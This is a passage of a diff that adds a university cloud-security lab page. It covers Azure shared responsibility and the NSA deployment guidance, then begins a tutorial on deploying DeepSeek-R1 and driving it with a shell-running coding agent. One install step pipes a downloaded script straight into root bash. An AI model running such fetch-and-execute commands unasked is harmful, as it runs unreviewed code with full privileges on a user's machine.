@@ -1,0 +1,935 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>lab 13 — Secure deployment in the cloud</title>
+<link rel="stylesheet" href="../_shared/lab-base.css?v=6">
+<link rel="stylesheet" href="styles.css?v=4">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism.min.css">
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-yaml.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+</head>
+<body>
+
+<button type="button" id="present-toggle" class="present-toggle" title="Toggle presentation mode (P)">
+  <span class="present-icon">◧</span>
+  <span class="present-label">Present</span>
+</button>
+
+<aside class="toc">
+  <div class="toc-title">DS 6042</div>
+  <nav>
+    <ul>
+      <li><a href="#intro">Introduction</a></li>
+      <li><a href="#viz-try-it">Try it · shared responsibility</a></li>
+      <li><a href="#where">Where to find it</a></li>
+      <li><a href="#why">1 · Why cloud-managed?</a></li>
+      <li><a href="#platforms">2 · The Azure AI stack</a></li>
+      <li><a href="#nsa">3 · The NSA guidance</a></li>
+      <li><a href="#shared">4 · Shared responsibility</a></li>
+      <li><a href="#deploy">5 · Hands-on · Azure + DeepSeek-R1 + dcode</a></li>
+      <li><a href="#viz-arch" class="toc-sub">· architecture &amp; motivation</a></li>
+      <li><a href="#harden">6 · Hardening</a></li>
+      <li><a href="#iam-chain">7 · Attack chain · Azure managed identity</a></li>
+      <li><a href="#practices">8 · Best practices</a></li>
+      <li><a href="#antipatterns">9 · Anti-patterns</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+  </nav>
+  <div class="toc-foot">
+    <span style="color:var(--ink-mute)">Lab 13 · cloud-managed deployment · Azure · DeepSeek-R1 · dcode · NSA guide</span>
+  </div>
+</aside>
+
+<main>
+
+<header class="hero" id="intro">
+  <div class="eyebrow">DS 6042 · Lab 13 · 2026</div>
+  <h1>Secure deployment · cloud</h1>
+  <p class="subtitle">The cloud owns more than you think. You own less than the cloud says you do.</p>
+  <p class="byline">Lab 13 covers the same nine-layer stack as Lab 12, but with the boundary between you and a managed-service provider drawn explicitly. Ground the shared-responsibility model and the National Security Agency's (NSA) 2024 joint guidance, then build the whole thing from the command line on <span class="gloss" data-gloss="azure-foundry">Azure</span>: deploy the open-weights <span class="gloss" data-gloss="deepseek">DeepSeek-R1</span> model, wire it to <span class="gloss" data-gloss="deep-agent">Deep Agents Code</span> (<code>dcode</code>), an autonomous coding agent that reads your files and runs your shell, harden it against the NSA checklist, and walk an Azure attack chain that turns one web bug into subscription-wide access.</p>
+</header>
+
+<p class="course-frame keep-in-present">
+Cloud-managed serving is the most common production deployment pattern for large-language-model (LLM) applications today, and the most common <em>misunderstood</em> deployment pattern. The cloud documentation says "we handle everything"; the audit log says you misconfigured identity and access management (IAM) in week one. This lab makes the line explicit so you can defend the parts that are actually yours.
+</p>
+
+<p class="lede">
+The promise of a managed cloud platform — Google's Vertex AI, Microsoft's Azure AI Foundry, Amazon's Bedrock + SageMaker — is that you trade operational complexity for monthly billing. The promise is real and the trade-off is real. What the marketing pages tend to skip is the <strong><span class="gloss" data-gloss="shared-responsibility">shared-responsibility model</span></strong>: who is on the hook for which layer of the stack. In April 2024 the NSA, the Cybersecurity and Infrastructure Security Agency (CISA), and five allied cyber agencies <a href="https://media.defense.gov/2024/Apr/15/2003439257/-1/-1/0/CSI-DEPLOYING-AI-SYSTEMS-SECURELY.PDF">jointly published</a> the most authoritative current answer to that question; it's the spine of this lab.
+</p>
+
+<div class="cite">
+  Joint guidance: NSA · CISA · Federal Bureau of Investigation (FBI) · Australian Signals Directorate (ASD) · Canadian Centre for Cyber Security (CCCS) · National Cyber Security Centre (NCSC) of New Zealand and the UK, <a href="https://media.defense.gov/2024/Apr/15/2003439257/-1/-1/0/CSI-DEPLOYING-AI-SYSTEMS-SECURELY.PDF"><em>Deploying AI Systems Securely</em></a> (April 2024) · platform docs: <a href="https://cloud.google.com/vertex-ai/docs">Vertex AI</a> · <a href="https://learn.microsoft.com/azure/ai-studio/">Azure AI Foundry</a> · <a href="https://docs.aws.amazon.com/bedrock/">AWS Bedrock</a> · auditing framework: <a href="https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final">National Institute of Standards and Technology (NIST) SP 800-53 Rev. 5</a>.
+</div>
+
+<p class="glossary-hint">
+  Cloud and identity vocabulary appears throughout: <strong>Entra ID</strong>, <strong>managed identity</strong>, <strong>IMDS</strong>, <strong>Key Vault / KMS</strong>, <strong>RBAC</strong>, <strong>private endpoint</strong>. Every term <span class="gloss-demo">underlined like this</span> is hoverable: an explainer opens directly below the line you're reading, pushing the rest of the page down — nothing gets covered.
+</p>
+
+<div class="glossary-panel" id="glossary-panel" hidden aria-live="polite">
+  <button type="button" class="glossary-close" id="glossary-close" aria-label="Close explainer">×</button>
+  <div class="glossary-content" id="glossary-content"></div>
+</div>
+
+<!-- ============================================================ -->
+<!-- TRY IT — shared-responsibility toggle                          -->
+<!-- ============================================================ -->
+<div class="viz" id="viz-try-it">
+  <div class="viz-title">Try it · who owns each layer · drag the deployment pattern</div>
+  <div class="viz-description">
+    The same nine-layer stack from <a href="../lab-12/server.html">Lab 12</a>, but the colour of each layer tells you who's responsible. <strong>Pick a deployment pattern</strong> below to see how the boundary moves. The line is not where the marketing says it is.
+  </div>
+  <div class="pattern-picker">
+    <label class="pattern-opt"><input type="radio" name="pattern" value="saas" checked><span>SaaS (software-as-a-service) API <em>(Gemini, Claude, OpenAI)</em></span></label>
+    <label class="pattern-opt"><input type="radio" name="pattern" value="managed"><span>Managed inference <em>(Vertex / Bedrock / Foundry hosting open-weights)</em></span></label>
+    <label class="pattern-opt"><input type="radio" name="pattern" value="hosted"><span>Self-hosted on cloud <em>(GKE/EKS/AKS managed Kubernetes — Lab 12 in a cloud virtual machine, VM)</em></span></label>
+  </div>
+  <svg id="resp-svg" class="resp-svg" viewBox="0 0 640 540" preserveAspectRatio="xMidYMid meet" aria-label="Shared-responsibility per layer"></svg>
+  <div class="resp-detail" id="resp-detail">Click any layer for what each party owns at this position.</div>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="where">Where to find it</h2>
+<ul>
+  <li><strong>NSA / CISA joint guidance</strong> — the authoritative 2024 doc. <a href="https://media.defense.gov/2024/Apr/15/2003439257/-1/-1/0/CSI-DEPLOYING-AI-SYSTEMS-SECURELY.PDF">media.defense.gov</a>.</li>
+  <li><strong>Vertex AI</strong> — Google's managed machine-learning (ML) platform (Model Garden, endpoints, agent builder). <a href="https://cloud.google.com/vertex-ai/docs">cloud.google.com/vertex-ai</a>.</li>
+  <li><strong>Azure AI Foundry</strong> — Microsoft's umbrella platform (was Azure ML + Azure OpenAI + Cognitive Services). <a href="https://learn.microsoft.com/azure/ai-studio/">learn.microsoft.com/azure/ai-studio</a>.</li>
+  <li><strong>AWS Bedrock + SageMaker</strong> — Amazon's managed-model service + ML platform. <a href="https://docs.aws.amazon.com/bedrock/">docs.aws.amazon.com/bedrock</a>.</li>
+  <li><strong>A paid Azure subscription</strong> — pay-as-you-go, set up with a payment method and a spend budget. A <strong>prepaid debit card</strong> is ideal for a lab: its loaded balance is a hard ceiling Azure can never exceed. This is the account the hands-on uses. <a href="https://azure.microsoft.com/pricing/purchase-options/pay-as-you-go/">azure.microsoft.com/…/pay-as-you-go</a>.</li>
+  <li><strong>DeepSeek-R1</strong> — DeepSeek's MIT-licensed open-weights frontier model: strong at code, supports tool-calling (so agents can drive it), and hosted on Azure as a <em>sold-by-Azure</em> serverless offer — the cleanest CLI deploy. <a href="https://api-docs.deepseek.com">deepseek.com</a> · <a href="https://huggingface.co/deepseek-ai">weights on Hugging Face</a>.</li>
+  <li><strong>Deep Agents Code (<code>dcode</code>)</strong> — LangChain's open-source terminal coding agent, built on the <code>deepagents</code> software development kit (SDK). <a href="https://docs.langchain.com/oss/python/deepagents/code/overview">docs.langchain.com/…/deepagents/code</a>.</li>
+</ul>
+
+<!-- ============================================================ -->
+<h2 id="why">1 · Why cloud-managed?</h2>
+
+<p>Three honest reasons, in order of how often they matter:</p>
+
+<div class="callout tps">
+  <span class="label">Think · Pair · Share · what you trade away</span>
+  <ul class="tps-steps">
+    <li><span class="tps-phase">Think · 2 min</span>Managed inference trades operational complexity for monthly billing. On your own, name the single biggest reason a team-of-one <em>can't</em> just self-host (think hardware access), and the single biggest security cost they accept in return — where does your data actually go that you can no longer see?</li>
+  </ul>
+  <details class="tps-reveal">
+    <summary>I've done the Think step — reveal Pair &amp; Share</summary>
+    <ul class="tps-steps">
+      <li><span class="tps-phase">Pair · 3 min</span>Compare. Did your partner lead with cost, with GPUs, or with compliance? Which of you flagged vendor lock-in as a security concern and not just a budget one?</li>
+      <li><span class="tps-phase">Share · 2 min</span>As a table, commit to the one reason you'd give a skeptical advisor for going managed and the one risk you'd disclose in the same breath — then check both against the two lists in <a href="#why">§1</a>.</li>
+    </ul>
+  </details>
+</div>
+
+<ol>
+  <li><strong>You can't get GPUs.</strong> The hyperscalers have them; you don't. For most graduate research and most production launches in 2026, managed inference is the only way to access H100/H200/B200-class hardware in under three months.</li>
+  <li><strong>Compliance becomes a config flag.</strong> SOC 2, HIPAA, FedRAMP, GDPR data-residency — the platforms have spent years getting their underlying infrastructure certified. You inherit the certifications by deploying into the right region with the right service flags.</li>
+  <li><strong>Operational complexity gets amortized.</strong> Autoscaling, multi-region failover, model-version-pinned rollouts, audit logging — the platforms ship these as primitives. Your team-of-one doesn't have to build them.</li>
+</ol>
+
+<p>And three honest reasons the trade-off goes the other way:</p>
+
+<ol>
+  <li><strong>Per-request pricing.</strong> At scale, managed inference is dramatically more expensive than self-hosted. Crossover point is typically 10–100M requests/month.</li>
+  <li><strong>Data residency you don't fully control.</strong> Even "your data in your region," the platform's logs, debug artifacts, and abuse-prevention systems may touch your data outside your view.</li>
+  <li><strong>Lock-in.</strong> Vertex's agent framework is not portable to Bedrock. Foundry's content filter is not exposed elsewhere. The convenience comes with a vendor.</li>
+</ol>
+
+<!-- ============================================================ -->
+<h2 id="platforms">2 · The Azure AI stack · one service per security job</h2>
+
+<p>This lab builds on Azure, so here's the toolbox you'll actually touch, mapped to the security job each service does and the one thing <em>you</em> configure. Every row is a layer from the Lab 12 stack that the shared-responsibility line hands to you.</p>
+
+<table>
+  <thead><tr><th>Security job</th><th>Azure service</th><th>What you configure</th></tr></thead>
+  <tbody>
+    <tr><td>Serve an open-weights model</td><td><span class="gloss" data-gloss="azure-foundry">Azure AI Foundry</span> model catalog (<span class="gloss" data-gloss="serverless">serverless</span> or <span class="gloss" data-gloss="managed-compute">managed compute</span>)</td><td>Which model, which deployment mode, content filter on</td></tr>
+    <tr><td>Frontier first-party model</td><td>Azure OpenAI (GPT family)</td><td>Deployment + content filter tier</td></tr>
+    <tr><td>Identity &amp; authorization</td><td><span class="gloss" data-gloss="entra-id">Microsoft Entra ID</span> + <span class="gloss" data-gloss="managed-identity">managed identity</span></td><td>Least-privilege RBAC roles, no static keys</td></tr>
+    <tr><td>Private networking</td><td>Private Endpoints + virtual network (VNet) / <span class="gloss" data-gloss="nsg">NSG</span> (network security group)</td><td>Default-deny public; no <code>Internet</code>-sourced rules</td></tr>
+    <tr><td>Secrets &amp; keys at rest</td><td>Azure Key Vault (customer-managed keys)</td><td>RBAC access model, rotation, purge old versions</td></tr>
+    <tr><td>Audit logging</td><td>Azure Monitor + Log Analytics (<span class="gloss" data-gloss="kql">KQL</span>, Kusto Query Language)</td><td>Diagnostic settings, retention, alerts</td></tr>
+    <tr><td>Output safety filter</td><td>Azure AI Content Safety</td><td>On by default; tune categories/thresholds</td></tr>
+    <tr><td>Threat detection</td><td>Microsoft Defender for Cloud</td><td>Enable plans; triage findings</td></tr>
+    <tr><td>Account &amp; billing</td><td>Pay-as-you-go subscription + Cost Management budget</td><td>Prepaid debit card = hard ceiling; budget alerts</td></tr>
+  </tbody>
+</table>
+
+<p>Google's Vertex AI and AWS Bedrock + SageMaker have an equivalent for every row — Workload Identity vs. managed identity, virtual private cloud (VPC) Service Controls vs. Private Endpoints, Cloud KMS vs. Key Vault. The <em>concepts</em> transfer cleanly; the names, the APIs, and the default-on/off states don't. The rest of this lab is Azure-specific on purpose — you learn the shape of one production cloud in depth rather than three in outline.</p>
+
+<!-- ============================================================ -->
+<h2 id="nsa">3 · The NSA joint guidance · seven principles</h2>
+
+<p>In April 2024 the NSA, CISA, FBI, and the cyber agencies of Australia, Canada, New Zealand, and the UK jointly published <span class="gloss" data-gloss="nsa-ai-guide"><em>Deploying AI Systems Securely</em></span>. It's 19 pages, vendor-neutral, and the most authoritative current statement of what a hardened deployment looks like. The seven themes, compressed:</p>
+
+<div class="callout tps">
+  <span class="label">Think · Pair · Share · predict the checklist</span>
+  <ul class="tps-steps">
+    <li><span class="tps-phase">Think · 3 min</span>Before reading their list: if seven cyber agencies had to compress "secure AI deployment" into seven principles, what would <em>you</em> write down? On your own, jot seven — and be concrete about the AI-specific ones (where do model weights, query monitoring, and exposed inference APIs fit that a generic web-app checklist would miss?).</li>
+  </ul>
+  <details class="tps-reveal">
+    <summary>I've done the Think step — reveal Pair &amp; Share</summary>
+    <ul class="tps-steps">
+      <li><span class="tps-phase">Pair · 3 min</span>Trade lists. Which principle did your partner have that you didn't? Did either of you separate "encrypt the weights" from "control who can assume the role that reads them" — or did you collapse them into one?</li>
+      <li><span class="tps-phase">Share · 2 min</span>As a table, pick the one principle you predict you'll see <em>violated</em> most often in real deployments, then track whether it's the one the attack chain leans on in <a href="#iam-chain">§7</a>.</li>
+    </ul>
+  </details>
+</div>
+
+<ol class="nsa-list">
+  <li><strong>Inherit a secure deployment environment</strong> — don't harden a deployment after the fact; deploy it <em>into</em> a foundation that is already hardened. That foundation is a <strong>landing zone</strong>: a pre-built, pre-secured cloud environment (identity, networking, logging, and guardrails already wired up) that new workloads drop into. You keep it hardened with <strong>baseline policies</strong> — rules the platform auto-enforces, like Azure Policy denying a public IP address or requiring encryption — checked against a published standard such as the <strong><a href="https://www.cisecurity.org/cis-benchmarks/">CIS Benchmarks</a></strong> (the Center for Internet Security's freely-published, consensus list of secure configuration settings for a given platform). And the <strong>paved road</strong> is the platform team's pre-approved, secure-by-default template for deploying, so that doing the secure thing is also the <em>easy</em> thing — you don't have to reinvent (and forget) the security controls each time.</li>
+  <li><strong>Continuously protect the artificial-intelligence (AI) system</strong> — model and weights at rest (encrypted via a <span class="gloss" data-gloss="kms">KMS</span>, a key management service), in transit (Transport Layer Security (TLS) 1.3, mutual TLS (mTLS) for internal), and in use (a trusted execution environment, TEE, for the highest-stakes workloads).</li>
+  <li><strong>Secure exposed APIs (application programming interfaces)</strong> — strong authentication (<span class="gloss" data-gloss="workload-identity">workload identity</span>, not static keys), input validation, rate limiting, output filtering.</li>
+  <li><strong>Actively monitor model behaviour</strong> — anomaly detection on query distributions, drift detection, output classifier verdicts logged and reviewed.</li>
+  <li><strong>Protect model weights</strong> — provenance, integrity checks, access control on training datasets and fine-tuned variants. Treat weights as crown-jewel IP.</li>
+  <li><strong>Enforce strict access controls</strong> — <span class="gloss" data-gloss="iam">IAM</span> least-privilege, no broad service accounts, time-bound elevation, separation of duties.</li>
+  <li><strong>Conduct ongoing testing</strong> — red-team exercises, adversarial robustness tests, supply-chain audits. Not just at launch — continuously.</li>
+</ol>
+
+<p>None of these are surprising. The value of the document is that <em>seven cyber agencies wrote them down together</em>, which makes it the right artifact to cite in your security review meeting when someone asks "is this safe enough?" The answer becomes a checklist, not a vibe.</p>
+
+<!-- ============================================================ -->
+<h2 id="shared">4 · Shared responsibility, written out</h2>
+
+<p>The try-it widget at the top of the page is the canonical reference for this section. In prose: with managed inference (the middle position in the widget), the cloud owns the bottom of the component stack from <a href="../lab-12/server.html">Lab 12</a> (hardware, inference runtime, the inference server) and <em>you</em> own the top (your API gateway, application logic, identity, observability config). Three layers in between are explicitly <em>shared</em> — model weights, network, and observability — where each side has a distinct job and the breach usually happens in the seam. Click through the widget layer by layer to see exactly who owns what. Two specific responsibilities people get wrong:</p>
+
+<div class="callout tps">
+  <span class="label">Think · Pair · Share · where the line really falls</span>
+  <ul class="tps-steps">
+    <li><span class="tps-phase">Think · 2 min</span>The marketing page says "we handle security." On your own, list three specific things that are still <em>entirely yours</em> on managed inference — and for each, name a real breach (or breach class) that happened because a customer assumed the cloud had it covered.</li>
+  </ul>
+  <details class="tps-reveal">
+    <summary>I've done the Think step — reveal Pair &amp; Share</summary>
+    <ul class="tps-steps">
+      <li><span class="tps-phase">Pair · 3 min</span>Compare your lists. Did either of you put "private endpoints" in the cloud's column? Argue out whether a private endpoint actually stops a compromised service account in your own VPC.</li>
+      <li><span class="tps-phase">Share · 2 min</span>As a table, write the two customer-owned responsibilities you think students most often misattribute to the cloud — then check them against the two callouts in <a href="#shared">§4</a> below.</li>
+    </ul>
+  </details>
+</div>
+
+<div class="callout insight">
+  <span class="label">"the cloud handles security"</span>
+  <p>Half-true. The cloud handles <em>infrastructure</em> security — physical access, hypervisor isolation, patching of the inference runtime, encryption at rest. The cloud does <strong>not</strong> handle <em>your</em> IAM policies, <em>your</em> VPC configuration, <em>your</em> audit log retention, <em>your</em> system prompt, <em>your</em> output filtering, or <em>your</em> rate limits. The <a href="https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/">Capital One breach (2019)</a> — an SSRF-to-metadata-service attack, the same pattern you walk in §7 — and the <a href="https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion">Snowflake credential-stuffing campaign (2024)</a> are both "the cloud handled their part; the customer didn't."</p>
+</div>
+
+<div class="callout insight">
+  <span class="label">"private endpoints make it secure"</span>
+  <p>Necessary, not sufficient. <span class="gloss" data-gloss="private-endpoint">Private endpoints</span> stop your traffic from crossing the public internet, which removes a real class of attack. They do <em>not</em> stop a compromised service account in your VPC from calling the model API freely; that's an IAM problem. They do not stop prompt injection; that's an application problem. The defense-in-depth point from Lab 11 applies here.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="deploy">5 · Hands-on · deploy DeepSeek-R1 on Azure and drive it with a coding agent <span class="time-tag">~75 min</span></h2>
+
+<p>You're going to build a <strong>self-hosted, open-source Claude Code</strong>: a local coding agent (<span class="gloss" data-gloss="deep-agent">Deep Agents Code</span>, <code>dcode</code>) driven by a frontier model you run yourself (<span class="gloss" data-gloss="deepseek">DeepSeek-R1</span>) on infrastructure you rent. The agent lives on your laptop; the model lives on Azure. Everything — signup aside — happens from the terminal, so you see what a <em>production</em> deployment actually looks like from the operator's chair, not a portal's happy path.</p>
+
+<div class="callout insight">
+  <span class="label">Why this lab, this stack — the motivation</span>
+  <p>The shape is deliberately the same as the coding assistant you already use: a thin local agent that reads your repo and runs your shell, talking to a big model over the network. The difference — and the entire lesson — is that <strong>you own the model and the deployment</strong>. That splits into three decisions, and the interesting security lives at their intersection:</p>
+  <ul>
+    <li><strong>Why cloud-managed, not self-hosted?</strong> You can't get a graphics processing unit (GPU) big enough for a frontier model, and you don't want to be the site reliability engineer (SRE). Azure runs the silicon and the serving runtime; you keep control of identity, network, and data.</li>
+    <li><strong>Why DeepSeek-R1, not GPT or Claude?</strong> It's <em>open weights</em> under an MIT license with frontier-class coding and tool-calling. Open weights means no per-token frontier pricing, no vendor lock-in on the model itself, and the option to move it in-house later. You're buying <em>hosting</em> from Azure, not the model — a very different lock-in profile from a SaaS API.</li>
+    <li><strong>Why hook it to an agent?</strong> Because that's what these models are for now, and it's where the risk moved. <code>dcode</code> can read your files, edit them, and <strong>run your shell</strong>. The moment a model drives a shell, "the model said something wrong" becomes "the model <em>ran</em> something wrong on your machine." Securing the endpoint (auth, private networking, content safety, audit) and constraining the agent (approval gates, scoped tools, a sandbox) are the same defense-in-depth idea attacked from two sides — the cloud side and the client side.</li>
+  </ul>
+</div>
+
+<div class="viz" id="viz-arch">
+  <div class="viz-title">Try it · the architecture you're about to build</div>
+  <div class="viz-description">
+    Every component of the hands-on and the trust boundary between them. Your laptop runs the <strong>dcode</strong> agent; everything to the right lives in <em>your</em> Azure subscription. <strong>Click any box</strong> for what it does, who owns it, and the one thing you configure to keep it safe. Arrows are the request paths; the dashed line is the boundary the shared-responsibility model draws.
+  </div>
+  <svg id="arch-svg" class="arch-svg" viewBox="0 0 720 430" preserveAspectRatio="xMidYMid meet" aria-label="Azure + DeepSeek-R1 + dcode architecture"></svg>
+  <div class="arch-detail" id="arch-detail">Click any component for details.</div>
+</div>
+
+<div class="callout tps">
+  <span class="label">Think · Pair · Share · which single setting is load-bearing?</span>
+  <ul class="tps-steps">
+    <li><span class="tps-phase">Think · 2 min</span>You're about to wire five things — an Entra login, a Foundry project, a DeepSeek-R1 endpoint with a key, a content filter, and an audit sink — and then hand the endpoint's key to an agent that runs your shell. On your own, predict the <em>single</em> setting whose default value most decides whether this is safe: is it the endpoint's network exposure, the key you paste into the agent's config, or the agent's shell-approval gate? Write down what goes wrong if each is left at its default.</li>
+  </ul>
+  <details class="tps-reveal">
+    <summary>I've done the Think step — reveal Pair &amp; Share</summary>
+    <ul class="tps-steps">
+      <li><span class="tps-phase">Pair · 3 min</span>Compare. Did one of you pick a <em>cloud-side</em> control (public endpoint) and the other a <em>client-side</em> one (auto-approve shell)? Argue out which one an attacker reaches first — and whether a private endpoint helps at all once the agent on your laptop holds a valid key.</li>
+      <li><span class="tps-phase">Share · 2 min</span>As a table, commit to the one cloud-side and one client-side setting you'd check first, then track them through <a href="#deploy">5.3 (endpoint auth/network)</a> and <a href="#deploy">5.5 (dcode approval gates)</a>.</li>
+    </ul>
+    <details class="tps-reveal">
+      <summary>Reveal the answer (after you've committed)</summary>
+      <div class="tps-answer">
+        <p><strong>The trap in the question is "single."</strong> There are <em>two</em> load-bearing settings and they sit on opposite sides of the trust boundary — assuming one covers the other is how the incident happens.</p>
+        <ul>
+          <li><strong>Endpoint network exposure (cloud-side) — safe at its default, <em>if</em> you stay on the paved road.</strong> The serverless endpoint is key-authenticated and Content Safety is on out of the box. Network exposure only becomes load-bearing when you leave that road and self-host on a VM whose NSG opens the port to the internet — the §7 finale. On the serverless path this default is fine.</li>
+          <li><strong>The key — the pivot, not a setting so much as <em>where you put it</em>.</strong> It's a bearer credential: whoever holds it can call your model and bill your subscription. The danger is pasting it into <code>~/.deepagents/.env</code> or committing it, so a laptop compromise (or a prompt-injected agent reading its own config) walks off with it. Keep it in an env var or Key Vault; rotate it.</li>
+          <li><strong>The shell-approval gate (client-side) — the one whose default is actively protecting you.</strong> <code>dcode</code> ships with approval gates <strong>on</strong>. Flip them off (a <code>--yolo</code>-style flag) and a hallucinated or prompt-injected command runs on your machine. That single default going from on to off is the change most likely to turn "the model said something wrong" into "the model <em>ran</em> something wrong."</li>
+        </ul>
+        <p><strong>The Pair-step punchline:</strong> a <em>private endpoint does not help</em> once the agent on your laptop holds a valid key. The agent authenticates legitimately, so a network control never sees an "attacker" to block. That's why the worst-case blast radius is bounded on the <em>client</em> side (the approval gate), not the cloud side — and why the honest answer is "check both, and never assume the cloud-side control contains a client-side failure." You'll wire the cloud side in <a href="#deploy">§5.3</a>, the approval gate in <a href="#deploy">§5.5</a>, and key handling in <a href="#harden">§6, hardening row 8</a>.</p>
+      </div>
+    </details>
+  </details>
+</div>
+
+<details class="setup-details" open>
+  <summary>Prerequisites — open by default; collapse if your environment is ready.</summary>
+  <ul>
+    <li>A <strong>paid Azure subscription</strong> (pay-as-you-go) with a payment method on file — a <strong>prepaid debit card</strong> is ideal for a lab — and a <a href="https://portal.azure.com/#view/Microsoft_Azure_CostManagement/Menu/~/budgets">budget</a> set.</li>
+    <li><a href="https://learn.microsoft.com/cli/azure/install-azure-cli">Azure CLI</a> (<code>az</code>) 2.70+ and the <code>ml</code> extension (<code>az extension add -n ml</code>).</li>
+    <li>Python 3.11+ for the <code>deepagents</code> SDK path.</li>
+  </ul>
+</details>
+
+<div class="callout note keep-in-present">
+  <span class="label">Tested on macOS · your budget and how to make it last</span>
+  <p>The balance you load on the prepaid card — reinforced by the spend budget you set — is your ceiling; the only question is <em>billing shape</em>:</p>
+  <ul>
+    <li><strong>Serverless — pay per token.</strong> You're billed only for what the agent generates, so a coding agent can run against it for weeks on a small balance. <em>Prefer this.</em></li>
+    <li><strong>Managed compute — pay per hour.</strong> A GPU VM bills whether or not anyone is using it, so it burns the balance fast unless you <strong>scale it to zero</strong> — drop its running instance count to 0 (or just delete the deployment) so no GPU is billing while you're not using it.</li>
+  </ul>
+  <p><strong>One wrinkle:</strong> a brand-new subscription occasionally needs a few minutes after the card is added before it will create serverless (pay-as-you-go) deployments. If <code>az ml serverless-endpoint create</code> is rejected at first, wait and retry or fall back to managed compute (below). Either way, the endpoint, agent, and audit steps are identical.</p>
+</div>
+
+<h3>5.1 Set up your Azure subscription (CLI, a paid plan, and a budget)</h3>
+<p>Create the subscription in the browser once — a <strong>pay-as-you-go</strong> plan with a <strong>prepaid debit card</strong> as the payment method and a <strong>budget</strong> set (both covered below) — then do everything else from the terminal.</p>
+
+<p><strong>Install the Azure CLI</strong> if you don't have <code>az</code> yet:</p>
+<ul>
+  <li><strong>macOS:</strong> <code>brew install azure-cli</code></li>
+  <li><strong>Windows:</strong> <code>winget install -e --id Microsoft.AzureCLI</code> (or the <a href="https://aka.ms/installazurecliwindows">MSI installer</a>)</li>
+  <li><strong>Linux (Debian/Ubuntu):</strong> <code>curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash</code> — <a href="https://learn.microsoft.com/cli/azure/install-azure-cli-linux">other distros</a></li>
+</ul>
+<p>Then add the ML extension and check the version:</p>
+<pre><code class="language-bash">az extension add -n ml            # or: az extension update -n ml  (to refresh it)
+az version                        # azure-cli 2.70+ recommended</code></pre>
+
+<p><strong>Sign in.</strong> <code>az login</code> opens a browser for the Entra sign-in and caches a token every later command reuses. On a headless or SSH box where no browser can open, use the device-code flow:</p>
+<pre><code class="language-bash">az login                          # opens a browser → Microsoft Entra ID sign-in
+az login --use-device-code        # headless / remote alternative</code></pre>
+
+<p><strong>Pick — and verify — the subscription.</strong> You may have more than one (a university or personal subscription <em>and</em> your lab subscription). List them, set the one you intend to spend on <em>by name or id</em>, and confirm you landed on it:</p>
+<pre><code class="language-bash">az account list -o table                              # every subscription you can see
+az account set --subscription "DS6042 Lab"            # or: --subscription &lt;id&gt;
+az account show --query "{name:name, state:state, user:user.name}" -o table</code></pre>
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">az account show --query "{name:name, state:state, user:user.name}" -o table</span>
+Name         State    User
+-----------  -------  ------------------
+DS6042 Lab   Enabled  you@virginia.edu</pre>
+
+<div class="viz">
+  <div class="viz-title">Portal reference · All services → Subscriptions</div>
+  <div class="viz-description">
+    The same list, in the portal. Three columns matter: the <strong>name</strong>, the <strong>Subscription ID</strong> (the GUID — treat it as sensitive; it's blurred here), and <strong>My role</strong>. Deploy into the one where your role is <strong>Owner</strong> (green). Never deploy into a <em>production</em> subscription you only have limited access to (red).
+  </div>
+  <svg viewBox="0 0 720 200" style="display:block;width:100%;max-width:720px;height:auto;margin:4px auto;background:#fff;border:1px solid var(--rule);border-radius:6px;font-family:system-ui,-apple-system,'Segoe UI',sans-serif" aria-label="Azure portal Subscriptions list, illustrative, IDs redacted">
+    <rect x="0" y="0" width="720" height="28" fill="#0078d4"/>
+    <text x="14" y="18" fill="#fff" font-size="12" font-weight="700">Microsoft Azure</text>
+    <text x="14" y="48" fill="#666" font-size="11">All services  ›  Subscriptions</text>
+    <text x="14" y="72" fill="#1f1d1a" font-size="19" font-weight="700">Subscriptions</text>
+    <text x="24" y="104" fill="#333" font-size="11" font-weight="700">Subscription name</text>
+    <text x="230" y="104" fill="#333" font-size="11" font-weight="700">Subscription ID</text>
+    <text x="470" y="104" fill="#333" font-size="11" font-weight="700">My role</text>
+    <text x="600" y="104" fill="#333" font-size="11" font-weight="700">Current cost</text>
+    <line x1="14" y1="112" x2="706" y2="112" stroke="#e0ddd3"/>
+    <rect x="14" y="118" width="692" height="34" fill="#eef7f0"/>
+    <rect x="14" y="118" width="4" height="34" fill="#5a8a6f"/>
+    <text x="24" y="139" fill="#0067b8" font-size="12" font-weight="600">DS6042 Lab</text>
+    <text x="230" y="139" fill="#555" font-size="11" font-family="ui-monospace,SFMono-Regular,monospace">••••••••-••••-••••-••••••••••••</text>
+    <text x="470" y="139" fill="#1f1d1a" font-size="11">Owner</text>
+    <text x="600" y="139" fill="#1f1d1a" font-size="11">$0.00</text>
+    <text x="660" y="139" fill="#3f6b52" font-size="10" font-weight="700">← use this</text>
+    <rect x="14" y="156" width="692" height="34" fill="#fbecea"/>
+    <rect x="14" y="156" width="4" height="34" fill="#c0392b"/>
+    <text x="24" y="177" fill="#0067b8" font-size="12" font-weight="600">UVA-ITS-EICM-PROD</text>
+    <text x="230" y="177" fill="#555" font-size="11" font-family="ui-monospace,SFMono-Regular,monospace">••••••••-••••-••••-••••••••••••</text>
+    <text x="470" y="177" fill="#1f1d1a" font-size="11">Resource access</text>
+    <text x="600" y="177" fill="#c0392b" font-size="11">Unauthorized</text>
+    <text x="660" y="177" fill="#c0392b" font-size="10" font-weight="700">← never</text>
+  </svg>
+</div>
+
+<details class="callout note">
